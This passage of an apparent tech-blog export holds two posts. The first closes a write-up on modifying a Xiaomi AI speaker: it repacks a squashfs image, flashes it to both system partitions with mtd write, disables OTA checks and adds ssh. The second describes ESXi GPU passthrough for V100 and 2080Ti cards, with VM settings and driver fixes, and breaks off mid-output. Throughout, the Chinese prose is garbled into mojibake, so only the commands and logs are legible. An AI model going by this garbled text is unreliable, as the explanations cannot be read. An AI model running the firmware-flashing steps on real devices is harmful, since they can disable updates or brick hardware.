/usr/bin/check_mediaplayer_status</span><br><span class="line"><span class="meta">#</span><span class="bash"> At 03:00.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">0 3 * * * /bin/ota slient  <span class="comment"># check ota</span></span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æŸ¥çœ‹ ota è„šæœ¬ï¼Œå‘ç° ota æœåŠ¡å™¨åº”è¯¥æ˜¯ api.miwifi.comï¼Œç›´æ¥åœ¨ä¸Šçº§è·¯ç”±å°†åŸŸåå±è”½ä¹Ÿå¯ä»¥ã€‚</p>
<h3 id="5-é‡æ–°æ‰“åŒ…åˆ†åŒºï¼Œåˆ·å…¥è®¾å¤‡"><a href="#5-é‡æ–°æ‰“åŒ…åˆ†åŒºï¼Œåˆ·å…¥è®¾å¤‡" class="headerlink" title="5. é‡æ–°æ‰“åŒ…åˆ†åŒºï¼Œåˆ·å…¥è®¾å¤‡"></a>5. é‡æ–°æ‰“åŒ…åˆ†åŒºï¼Œåˆ·å…¥è®¾å¤‡</h3><p>æŒ‰ä¹‹å‰æŸ¥çœ‹ block size çš„ä¿¡æ¯ä½œä¸ºå‚æ•°é‡æ–°æ‰“åŒ…åˆ†åŒºï¼Œä¸åŒè®¾å¤‡å‹å·çš„ block size å¯èƒ½ä¸åŒã€‚</p>
<p>ä»ç„¶ç”¨ root æ“ä½œï¼Œä¸ç„¶æœ‰äº›æ–‡ä»¶æƒé™ä¼šå‡ºé—®é¢˜ã€‚å¦å¤–ä¸€å®šè¦åšä¸€å®šçš„å‹ç¼©ï¼Œå¦‚æœ img è¿‡å¤§ï¼Œä¼šå‡ºç°åˆ·å†™ä¸å®Œæ•´ï¼Œå¯¼è‡´åˆ†åŒºèµ·ä¸æ¥ï¼Œåˆ‡æ¢åˆ° b åˆ†åŒºã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/test/Desktop/xiaomi# mksquashfs m4 m4_crack.img -b 131072 -comp xz -Xbcj arm -Xdict-size 32K -no-xattrs</span><br><span class="line">Parallel mksquashfs: Using 4 processors</span><br><span class="line">Creating 4.0 filesystem on m4_crack.img, block size 131072.</span><br><span class="line">[======================================================\] 1495/1495 100%</span><br><span class="line"></span><br><span class="line">Exportable Squashfs 4.0 filesystem, xz compressed, data block size 131072</span><br><span class="line">	compressed data, compressed metadata, compressed fragments, no xattrs</span><br><span class="line">	duplicates are removed</span><br><span class="line">Filesystem size 32469.29 Kbytes (31.71 Mbytes)</span><br><span class="line">	46.00% of uncompressed filesystem size (70587.29 Kbytes)</span><br><span class="line">Inode table size 15932 bytes (15.56 Kbytes)</span><br><span class="line">	24.82% of uncompressed inode table size (64178 bytes)</span><br><span class="line">Directory table size 17978 bytes (17.56 Kbytes)</span><br><span class="line">	44.87% of uncompressed directory table size (40068 bytes)</span><br><span class="line">Number of duplicate files found 23</span><br><span class="line">Number of inodes 1763</span><br><span class="line">Number of files 1082</span><br><span class="line">Number of fragments 106</span><br><span class="line">Number of symbolic links  578</span><br><span class="line">Number of device nodes 1</span><br><span class="line">Number of fifo nodes 0</span><br><span class="line">Number of socket nodes 0</span><br><span class="line">Number of directories 102</span><br><span class="line">Number of ids (unique uids + gids) 1</span><br><span class="line">Number of uids 1</span><br><span class="line">	root (0)</span><br><span class="line">Number of gids 1</span><br><span class="line">	root (0)</span><br></pre></td></tr></table></figure>

<p>åœ¨å°çˆ±åŒå­¦ä¸Šåˆ é™¤ /tmp/m4.imgï¼Œå°†ä¿®æ”¹åçš„ <code>m4_crack.img</code> å¤åˆ¶å›å°çˆ±åŒå­¦çš„ä¸´æ—¶ç›®å½•ï¼Œåˆ·å†™é•œåƒåˆ° mtdblock4</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12:/tmp# mtd write m4_crack.img system0</span><br><span class="line">Unlocking system0 ...</span><br><span class="line"></span><br><span class="line">Writing from m4_crack.img to system0 ...  [w]         </span><br><span class="line">root@S12:/tmp# /usr/bin/fw_env -s boot_part boot0</span><br><span class="line">[ubootenv] update_bootenv_varible name [boot_part]: value [boot0]</span><br><span class="line">[ubootenv] Save ubootenv to /dev/nand_env succeed!</span><br></pre></td></tr></table></figure>



<p>å¦‚æœé‡å¯OKï¼Œå¹¶ä¸”æ²¡æœ‰åˆ‡åˆ° b åˆ†åŒºçš„è¯ï¼Œè¯æ˜åˆ·å†™æˆåŠŸï¼Œå¯ä»¥é€‰æ‹©æŠŠ b åˆ†åŒºä¹Ÿåˆ·å†™äº†</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12:/tmp# mtd write m4_crack.img system1</span><br><span class="line">Unlocking system1 ...</span><br><span class="line"></span><br><span class="line">Writing from m4_crack.img to system1 ...  [w]         </span><br><span class="line">root@S12:/tmp# </span><br></pre></td></tr></table></figure>

<h3 id="6-åè®°"><a href="#6-åè®°" class="headerlink" title="6. åè®°"></a>6. åè®°</h3><p>ä»è€å®¶å¯„æ¥äº†åœ¨ MIDC 2017 ä¼šè®®ä¸Šçš„ç¤¼å“ï¼Œé¦–å‘ç‰ˆ å°ç±³AIéŸ³ç®±ï¼Œè¿™ä¸ªæ‹†å¼€çœ‹æ˜¯é»‘è‰²æ¿å­çš„ï¼Œå¤§æ¦‚å¦‚å›¾ã€‚</p>
<img src="/2020/12/01/2020-12-01/black-board.jpg" class="">

<p>è¿™ä¸ªç¡¬ä»¶å‹å·çš„è®¾å¤‡ï¼Œç³»ç»Ÿæ²¡æœ‰ mount åˆ° roï¼Œå¯ä»¥ç›´æ¥å†™ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12:~# mount</span><br><span class="line">rootfs on / type rootfs (rw)</span><br><span class="line">/dev/ubi0_0 on / type ubifs (rw,noatime)</span><br><span class="line">devtmpfs on /dev type devtmpfs (rw,relatime,size=115548k,nr_inodes=28887,mode=755)</span><br><span class="line">proc on /proc type proc (rw,nosuid,nodev,noexec,noatime)</span><br><span class="line">sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,noatime)</span><br><span class="line">cgroup on /sys/fs/cgroup type cgroup (rw,nosuid,nodev,noexec,relatime,debug,cpu,cpuacct,devices,freezer,net_cls,blkio)</span><br><span class="line">tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noatime)</span><br><span class="line">tmpfs on /dev type tmpfs (rw,nosuid,relatime,size=512k,mode=755)</span><br><span class="line">debugfs on /sys/kernel/debug type debugfs (rw,noatime)</span><br><span class="line">/dev/ubi1_0 on /data type ubifs (rw,relatime)</span><br><span class="line">root@S12:~#</span><br></pre></td></tr></table></figure>

<p>ç±»ä¼¼æ–¹æ³•åŠ å…¥ sshï¼Œç¦ç”¨ ota å³å¯ã€‚</p>
<p>å¦å¤–å‘ç° <code>/tmp/mico_aivs_lab/instruction.log</code> æ–‡ä»¶ä¸­ä¸´æ—¶å­˜æœ‰å°çˆ±çš„äº¤æµæ—¥å¿—ï¼Œåé¢æœ‰ç©ºå¯ä»¥ç»“åˆ homeassistant æä¸€äº›äº‹æƒ…ã€‚</p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>iot</tag>
      </tags>
  </entry>
  <entry>
    <title>vmware ESXi æ˜¾å¡ç›´é€š &amp; Tesla V100 æ˜¾å¡æ”¯æŒç¯å¢ƒé…ç½®</title>
    <url>/2021/01/04/2021-01-04/</url>
    <content><![CDATA[<p>æœ€è¿‘å› ä¸ºä¸€äº›åŸå› ï¼Œå¯¹å…¬å¸çš„æœºå™¨å­¦ä¹ æœåŠ¡å™¨è¿›è¡Œäº†é‡è£…ï¼Œä¸ºäº†å‡å°‘ä»¥åè‚‰èº«å»è¿ç»´çš„æ¬¡æ•°ï¼ŒåŒæ—¶å¢åŠ æœåŠ¡å™¨çš„å¯æ‰©å±•æ€§ï¼Œç›´æ¥åœ¨ç‰©ç†æœºä¸Šè£…ä¸Šäº† ESXiã€‚åŒæ—¶éƒ¨ç½²å†…éƒ¨è™šæ‹Ÿç½‘ç»œï¼Œå¢åŠ é€æ˜ä»£ç†ã€‚ç‰©ç†æœºä¸Šæœ‰4å— 2080Ti å’Œ2å— Tesla V100 æ˜¾å¡ï¼Œé€šè¿‡ ESXi çš„æ˜¾å¡ç›´é€šï¼Œç›´æ¥å°† PCIe è®¾å¤‡æ·»åŠ è¿›æœºå™¨å­¦ä¹ æ‰€ç”¨çš„è™šæ‹Ÿæœºï¼ˆçœ‹äº†ä¸‹  NVIDIA Grid vGPU çš„æ–¹æ¡ˆå‘æ›´å¤šï¼Œé‚æ”¾å¼ƒï¼‰ã€‚è¿™é‡Œå°†è¿™ä¸ªè¿‡ç¨‹ä¸­é‡åˆ°çš„å‘è®°å½•ä¸€ä¸‹ã€‚</p>
<a id="more"></a>

<h2 id="GPU-Server-å®‰è£…"><a href="#GPU-Server-å®‰è£…" class="headerlink" title="GPU Server å®‰è£…"></a>GPU Server å®‰è£…</h2><h3 id="1-ç‰©ç†æœº-BIOS-å¼€å¯æ‰©å±•å¯»å€"><a href="#1-ç‰©ç†æœº-BIOS-å¼€å¯æ‰©å±•å¯»å€" class="headerlink" title="1. ç‰©ç†æœº BIOS å¼€å¯æ‰©å±•å¯»å€"></a>1. ç‰©ç†æœº BIOS å¼€å¯æ‰©å±•å¯»å€</h3><p>å› ä¸ºæˆ‘è¿™é‡Œçš„ V100 æ˜¾å¡å•å—æ˜¾å­˜æœ‰32GBï¼Œç»“åˆ nvidia å’Œ vmware çš„ç›¸å…³æ–‡æ¡£ï¼Œéœ€è¦å¼€å¯ BIOS çš„é«˜ä½å®½å¯»å€é€‰é¡¹ï¼Œå¯å‚è€ƒä¸‹å›¾è®¾ç½®</p>
<img src="/2021/01/04/2021-01-04/bios-mmio.jpg" class="">

<h3 id="2-å®‰è£…-ESXi-6-7-U3-updates"><a href="#2-å®‰è£…-ESXi-6-7-U3-updates" class="headerlink" title="2. å®‰è£… ESXi 6.7 U3 + updates"></a>2. å®‰è£… ESXi 6.7 U3 + updates</h3><p>å®‰è£…è¿‡ç¨‹æ¯”è¾ƒç®€å•ï¼Œé»˜è®¤å®‰è£…å³å¯ï¼Œè¿™é‡Œä¸åšè®°å½•ã€‚å› ä¸ºä¹‹å‰é‡åˆ°è¿‡ web UI æ— æ³•ç™»é™†çš„é—®é¢˜ï¼Œä¸ºäº†ä¿è¯ä¸ç”¨å»ç‰©ç†æ“ä½œæœºå™¨ï¼Œå®‰è£…å®Œ ESXi ååœ¨ç®¡ç†é¡µé¢é‡Œå¼€å¯ sshï¼Œåœ¨<code>/etc/ssh/keys-root/authorized_keys</code>ä¸­æ·»åŠ  ssh å¯†é’¥å¹¶é…ç½®æ–‡ä»¶æƒé™ï¼Œæ›´æ”¹ sshd é…ç½®ä¸­çš„ä¸¤æ¡ï¼Œç¦ç”¨å¯†ç ç™»å½•ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost:~] cat /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> ......</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ä»¥ä¸‹ä¸¤æ¡ä¸ºä¿®æ”¹/æ–°å¢å†…å®¹ï¼Œå…¶ä»–å†…å®¹ä¸å˜</span></span><br><span class="line">PasswordAuthentication no</span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"><span class="meta">#</span><span class="bash"> ......</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é‡å¯ ssh æœåŠ¡</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost:~] /etc/init.d/SSH restart</span><br></pre></td></tr></table></figure>

<h3 id="3-é…ç½®-ESXi-æ˜¾å¡ç›´é€š"><a href="#3-é…ç½®-ESXi-æ˜¾å¡ç›´é€š" class="headerlink" title="3. é…ç½® ESXi æ˜¾å¡ç›´é€š"></a>3. é…ç½® ESXi æ˜¾å¡ç›´é€š</h3><p>ç¡¬ä»¶ç›´é€šçš„åŸç†ç¤ºæ„å›¾å¤§è‡´å¦‚ä¸‹</p>
<img src="/2021/01/04/2021-01-04/esxi-passthru.png" class="">

<p>åœ¨ç®¡ç†é€‰é¡¹å¡çš„ç¡¬ä»¶é‡Œï¼Œè¿‡æ»¤å‡º NVIDIA è®¾å¤‡ï¼Œå¹¶é€‰å®šç›¸å…³è®¾å¤‡ï¼Œåˆ‡æ¢ç›´é€šå±æ€§ã€‚</p>
<img src="/2021/01/04/2021-01-04/nvidia-pcie.jpg" class="">

<h3 id="4-åˆ›å»ºè™šæ‹Ÿæœºï¼Œå°†æ˜¾å¡æ·»åŠ è‡³è™šæ‹Ÿæœºè®¾å¤‡"><a href="#4-åˆ›å»ºè™šæ‹Ÿæœºï¼Œå°†æ˜¾å¡æ·»åŠ è‡³è™šæ‹Ÿæœºè®¾å¤‡" class="headerlink" title="4. åˆ›å»ºè™šæ‹Ÿæœºï¼Œå°†æ˜¾å¡æ·»åŠ è‡³è™šæ‹Ÿæœºè®¾å¤‡"></a>4. åˆ›å»ºè™šæ‹Ÿæœºï¼Œå°†æ˜¾å¡æ·»åŠ è‡³è™šæ‹Ÿæœºè®¾å¤‡</h3><p>é¦–å…ˆæŒ‰æ­£å¸¸æµç¨‹æ–°å»ºä¸€ä¸ªè™šæ‹Ÿæœº (å…¼å®¹æ€§é€‰æ‹© ESXi 6.7è™šæ‹Ÿæœº å°±å¯ä»¥)ã€‚å› ä¸ºæœ‰æ˜¾å¡ç›´é€šï¼Œå†…å­˜å¿…é¡»é…ç½®æˆé¢„ç•™æ‰€æœ‰ã€‚åœ¨è™šæ‹Ÿæœºçš„è™šæ‹Ÿç¡¬ä»¶ä¸­ï¼Œé€ä¸€æ·»åŠ æ˜¾å¡è®¾å¤‡</p>
<img src="/2021/01/04/2021-01-04/vm-add-pcie.png" class="">

<p>æ·»åŠ çš„è¿‡ç¨‹å‘ç°ï¼ŒåŒä¸€å°è™šæ‹Ÿæœºä¸èƒ½ç›´é€šå¤ªå¤šçš„ PCIe è®¾å¤‡ï¼Œä½† 2080Ti æ˜¾å¡å¦‚æœåªç›´é€šä¸€ä¸ªä¸»è®¾å¤‡çš„è¯ï¼Œè™šæ‹Ÿæœºä¼šå‡ºé”™ã€‚</p>
<p>ç»è¿‡å¤šæ¬¡è¯•éªŒï¼Œå‘ç° 2080Ti è®¾å¤‡åªæ·»åŠ ä¸»è®¾å¤‡å’Œç¬¬äºŒä¸ªè®¾å¤‡ (USB 3.1 Host Controller) æ—¶ï¼Œæœºå™¨è¿è½¬æ­£å¸¸ã€‚è¿™æ ·åŠ ä¸Šä¸¤å¼  V100ï¼Œæ€»å…±10ä¸ª PCIe ç›´é€šè®¾å¤‡æ·»åŠ åˆ°è™šæ‹Ÿæœºã€‚</p>
<img src="/2021/01/04/2021-01-04/vm-pcie-list.jpg" class="">

<h3 id="5-é¢å¤–çš„è™šæ‹Ÿæœºå‚æ•°é…ç½®"><a href="#5-é¢å¤–çš„è™šæ‹Ÿæœºå‚æ•°é…ç½®" class="headerlink" title="5. é¢å¤–çš„è™šæ‹Ÿæœºå‚æ•°é…ç½®"></a>5. é¢å¤–çš„è™šæ‹Ÿæœºå‚æ•°é…ç½®</h3><p>åœ¨è™šæ‹Ÿæœºè®¾ç½®ä¸­ï¼Œæ·»åŠ æˆ–ä¿®æ”¹ä¸€äº›å¯åŠ¨å˜é‡ï¼Œé…ç½®è·¯å¾„å¦‚ä¸‹å›¾</p>
<img src="/2021/01/04/2021-01-04/boot-para.jpg" class="">

<p>åˆ†åˆ«æ·»åŠ ä»¥ä¸‹å‚æ•°</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> è®©Nå¡è®¤ä¸ºè®¾å¤‡ä¸åœ¨è™šæ‹Ÿç¯å¢ƒä¸­</span></span><br><span class="line">hypervisor.cpuid.v0 = FALSE</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å…³é—­vmwareé»˜è®¤æ˜¾å¡</span></span><br><span class="line">svga.present = FALSE # å®‰è£…å®Œç³»ç»Ÿå†è®¾ç½®ï¼Œå¯èƒ½å¯¼è‡´ESXié¡µé¢é‡Œè™šæ‹Ÿæ˜¾ç¤ºå™¨é»‘å±</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æ‰“å¼€ 64bit ä½å®½å¯»å€ï¼Œå¦‚æœæ²¡å¼€è¿™ä¸ªå°†è¯†åˆ«ä¸åˆ° V100 æ˜¾å¡</span></span><br><span class="line">pciPassthru.use64bitMMIO = TRUE</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> è®¾ç½® MMIO å†…å­˜å¤§å°ï¼ˆè¿™é‡Œå¿…é¡»ä¸º2çš„æ•´æ•°æ¬¡å¹‚ power-of-two)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> å‚è€ƒ https://kb.vmware.com/s/article/2142307 &amp; https://blogs.vmware.com/apps/2018/09/using-gpus-with-virtual-machines-on-vsphere-part-2-vmdirectpath-i-o.html ï¼‰</span></span><br><span class="line">pciPassthru.64bitMMIOSizeGB = 128</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> vGPU æ”¯æŒï¼Œçœ‹èµ·æ¥æ˜¯å¯¹ Grid çš„é…ç½®ï¼ŒåŠ ä¸Šä¹Ÿä¸å½±å“ï¼Œå‚è€ƒhttps://docs.nvidia.com/grid/4.7/grid-vgpu-release-notes-vmware-vsphere/index.html</span></span><br><span class="line">pciPassthru0.cfg.enable_large_sys_mem = 1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> è®¾ç½®æ¨¡å¼ä¸º IOAPICï¼Œå‚è€ƒ https://www.vmware.com/pdf/vsp_4_vmdirectpath_host.pdf</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> å¤šæ¬¡æŸ¥çœ‹å¯åŠ¨æ—¥å¿—ï¼Œå‘ç°è¿™é‡Œå¾—æŠŠæ‰€æœ‰ç›´é€šæ˜¾å¡è®¾å¤‡éƒ½å…³äº†æ‰è¡Œ</span></span><br><span class="line">pciPassthru0.msiEnabled = FALSE</span><br><span class="line">pciPassthru1.msiEnabled = FALSE</span><br><span class="line">pciPassthru2.msiEnabled = FALSE</span><br><span class="line">pciPassthru3.msiEnabled = FALSE</span><br><span class="line">pciPassthru4.msiEnabled = FALSE</span><br><span class="line">pciPassthru5.msiEnabled = FALSE</span><br><span class="line">pciPassthru6.msiEnabled = FALSE</span><br><span class="line">pciPassthru7.msiEnabled = FALSE</span><br><span class="line">pciPassthru8.msiEnabled = FALSE</span><br><span class="line">pciPassthru9.msiEnabled = FALSE</span><br></pre></td></tr></table></figure>

<p>é…ç½®å®Œæˆåï¼Œå¯ä»¥å°è¯•æŒ‚è½½ iso ï¼Œè¿›biosæ”¹å¼•å¯¼è¿›è¡Œç³»ç»Ÿå®‰è£…ï¼Œå¦‚æœè™šæ‹Ÿæœºå¯åŠ¨ä¸æˆåŠŸï¼Œå¯ä»¥ ssh ä¸Šå»åœ¨è™šæ‹Ÿæœºç›®å½•ä¸‹ <code>tail -F vmware.log</code>çœ‹çœ‹å“ªé‡Œå‡ºé”™äº†ï¼Œç›´é€šè®¾å¤‡å¤šå¯åŠ¨ä¼šæ¯”è¾ƒæ…¢ã€‚</p>
<p>åˆæ¬¡å¯åŠ¨æ—¶ï¼Œå¯èƒ½é‡åˆ°å¦‚ä¸‹é”™è¯¯:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vcpu-0| W115: CPU microcode update available.</span><br><span class="line">vcpu-0| W115+ The guest OS tried to update the microcode from patch level 67 (43h) to patch level 68 (44h), but VMware ESX does not allow microcode patches to be applied from within a virtual machine.</span><br><span class="line">vcpu-0| W115+ Microcode patches are used to correct CPU errata. You may be able to obtain a BIOS/firmware update which includes this microcode patch from your system vendor, or your host OS may provide a facility for loading microcode patches.APIC CMCI LVT write: 0xf9</span><br><span class="line">vcpu-0| I125: Tools: Tools heartbeat timeout.</span><br><span class="line">vcpu-0| I125: Tools: Running status rpc handler: 1 =&gt; 0.</span><br><span class="line">vcpu-0| I125: Tools: Changing running status: 1 =&gt; 0.</span><br></pre></td></tr></table></figure>
<p><del>å¯ä»¥åœ¨ESXiè®¾ç½®ä¸­ç¦ç”¨microcodeæ›´æ–°ï¼Œè·¯å¾„åœ¨<code>ç®¡ç†-&gt;ç³»ç»Ÿ-&gt;é«˜çº§è®¾ç½®-&gt;VMkernel.Boot.microcodeUpdate-&gt;FALSE</code>ã€‚</del><br>å‡çº§ESXiè¡¥ä¸å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå…ˆä»<span class="exturl" data-url="aHR0cHM6Ly9teS52bXdhcmUuY29tL3BhdGNoLyNzZWFyY2g=" title="https://my.vmware.com/patch/#search">å®˜ç½‘<i class="fa fa-external-link"></i></span>æœç´¢å¹¶ä¸‹è½½æœ€æ–°çš„è¡¥ä¸åŒ…ï¼Œä¸Šä¼ è‡³ESXiï¼Œé€šè¿‡<code>esxcli software vib update -d &quot;Patch.zip&quot;</code>å®‰è£…å‡çº§ã€‚<br>ï¼ˆå‚è€ƒ<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnZtd2FyZS5jb20vZW4vVk13YXJlLXZTcGhlcmUvNi43L3JuL2VzeGk2NzAtMjAyMTAzMDAxLmh0bWw=" title="https://docs.vmware.com/en/VMware-vSphere/6.7/rn/esxi670-202103001.html">å®˜ç½‘æ–‡æ¡£<i class="fa fa-external-link"></i></span>ï¼‰</p>
<h3 id="6-ç³»ç»Ÿé—®é¢˜"><a href="#6-ç³»ç»Ÿé—®é¢˜" class="headerlink" title="6. ç³»ç»Ÿé—®é¢˜"></a>6. ç³»ç»Ÿé—®é¢˜</h3><p>æˆ‘å®‰è£…çš„æ˜¯ ubuntu æ¡Œé¢ç‰ˆï¼Œå®‰è£…è¿‡ç¨‹æŒ‰ç…§æ­£å¸¸æµç¨‹å³å¯ï¼Œå®‰è£…å®Œæˆåå¯èƒ½æœ‰ä»¥ä¸‹é—®é¢˜ã€‚</p>
<h4 id="intel-microcode"><a href="#intel-microcode" class="headerlink" title="intel-microcode"></a>intel-microcode</h4><p>æœ‰ä¸€ä¸ª <code>intel-microcode</code> è½¯ä»¶åŒ…çš„æ›´æ–°ï¼Œä¼šå¯¼è‡´ç³»ç»Ÿé‡å¯åå¡åœ¨é»‘å±ã€‚ç›´æ¥å¸è½½è¿™ä¸ªè½¯ä»¶è²Œä¼¼ä¹Ÿæ²¡å•¥å½±å“ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@gpu-ubuntu:~# apt-get --purge remove intel-microcode</span><br></pre></td></tr></table></figure>

<h4 id="nouveau"><a href="#nouveau" class="headerlink" title="nouveau"></a>nouveau</h4><p>vmware çš„è™šæ‹Ÿç¡¬ä»¶é»˜è®¤ä¼šæœ‰ä¸€ä¸ªæ˜¾å¡ï¼Œä¼šå¯¼è‡´ç³»ç»ŸåŠ è½½ä¸€ä¸ª nouveau.ko çš„æ˜¾å¡é©±åŠ¨ï¼Œè¿™ä¸ªé©±åŠ¨ä¸ nvidia é©±åŠ¨å†²çªã€‚</p>
<p>é€šè¿‡å°† nouveau.ko åŠ å…¥é»‘åå•ï¼Œç¦ç”¨å…¶åŠ è½½ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@gpu-ubuntu:~# cat &lt;&lt;EOF &gt;&gt; /etc/modprobe.d/blacklist-nouveau.conf</span><br><span class="line"></span><br><span class="line">blacklist nouveau</span><br><span class="line">options nouveau modeset=0</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">root@gpu-ubuntu:~# update-initramfs -u</span><br><span class="line">root@gpu-ubuntu:~# shutdown -r 0             # é‡å¯ç”Ÿæ•ˆ</span><br></pre></td></tr></table></figure>



<h3 id="7-å¾…è§£å†³é—®é¢˜"><a href="#7-å¾…è§£å†³é—®é¢˜" class="headerlink" title="7. å¾…è§£å†³é—®é¢˜"></a>7. å¾…è§£å†³é—®é¢˜</h3><p>Nå¡é©±åŠ¨å®‰è£…å®Œä¹‹ååŸºæœ¬å°±å¯ä»¥ç”¨äº†ï¼Œè®¾å¤‡åˆ—è¡¨å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@gpu-ubuntu18:~# nvidia-smi</span><br><span class="line">Mon Jan  4 20:17:48 2021</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| NVIDIA-SMI 450.80.02    Driver Version: 450.80.02    CUDA Version: 11.0     |</span><br><span class="line">|-------------------------------+----------------------+----------------------+</span><br><span class="line">| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |</span><br><span class="line">| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |</span><br><span class="line">|                               |                      |               MIG M. |</span><br><span class="line">|===============================+======================+======================|</span><br><span class="line">|   0  Tesla V100-PCIE...  Off  | 00000000:03:00.0 Off |                    0 |</span><br><span class="line">| N/A   36C    P0    27W / 250W |      0MiB / 32510MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   1  GeForce RTX 208...  Off  | 00000000:04:00.0 Off |                  N/A |</span><br><span class="line">| 27%   29C    P8    15W / 250W |      0MiB / 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   2  GeForce RTX 208...  Off  | 00000000:05:00.0 Off |                  N/A |</span><br><span class="line">| 27%   29C    P8    15W / 250W |      0MiB / 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   3  Tesla V100-PCIE...  Off  | 00000000:0B:00.0 Off |                    0 |</span><br><span class="line">| N/A   35C    P0    25W / 250W |      0MiB / 32510MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   4  GeForce RTX 208...  Off  | 00000000:13:00.0 Off |                  N/A |</span><br><span class="line">| 27%   28C    P8     3W / 250W |      0MiB / 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   5  GeForce RTX 208...  Off  | 00000000:14:00.0 Off |                  N/A |</span><br><span class="line">| 27%   27C    P8     1W / 250W |      0MiB / 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line"></span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| Processes:                                                                  |</span><br><span class="line">|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |</span><br><span class="line">|        ID   ID                                                   Usage      |</span><br><span class="line">|=============================================================================|</span><br><span class="line">|  No running processes found                                                 |</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>ESXi é‡Œçš„ PCIe è®¾å¤‡é¡ºåºå’Œè¿™é‡Œçš„å¯¹åº”å…³ç³»æ²¡ææ˜ç™½ï¼Œè¯•äº†å¥½å‡ æ¬¡éƒ½æ²¡æœ‰æŠŠ V100 è°ƒæ•´åˆ°å‰é¢ï¼Œæ ¹æ®ç½‘ä¸Šçš„ä¸€äº›èµ„æ–™ï¼Œç›®å‰æ¥çœ‹æ­¤é—®é¢˜æš‚æ—¶æ— è§£ã€‚</p>
<h3 id="8-åç»­æ›´æ–°"><a href="#8-åç»­æ›´æ–°" class="headerlink" title="8. åç»­æ›´æ–°"></a>8. åç»­æ›´æ–°</h3><h4 id="20210816"><a href="#20210816" class="headerlink" title="20210816"></a>20210816</h4><p>æ–°æ·»äº†ä¸€å—NVIDIA Tesla A100 (40GB) å¡ï¼Œç›´é€šè¿›è™šæ‹Ÿæœºåç³»ç»Ÿèµ·ä¸æ¥äº†ï¼ŒæŸ¥çœ‹ESXiä¸­å¯¹åº”è™šæ‹Ÿæœºçš„æ—¥å¿—<code>/vmfs/volumes/[uuid]/[gpu-server]</code>ï¼Œå­˜åœ¨å¦‚ä¸‹é”™è¯¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">2021-08-16T08:19:19.467Z| vcpu-0| I125: [msg.efi.pciMmioError] The firmware could not allocate 202933248 KB of PCI MMIO. Increase the size of PCI MMIO and try again.</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹è™šæ‹Ÿæœºå¯åŠ¨å‚æ•°ä¸­çš„MMIOé€‰é¡¹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> pciPassthru.64bitMMIOSizeGB = 256</span></span><br></pre></td></tr></table></figure>
<p>ä¿å­˜åå¯åŠ¨æ­£å¸¸</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| NVIDIA-SMI 450.102.04   Driver Version: 450.102.04   CUDA Version: 11.0     |</span><br><span class="line">|-------------------------------+----------------------+----------------------+</span><br><span class="line">| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |</span><br><span class="line">| Fan  Temp  Perf  Pwr:Usage&#x2F;Cap|         Memory-Usage | GPU-Util  Compute M. |</span><br><span class="line">|                               |                      |               MIG M. |</span><br><span 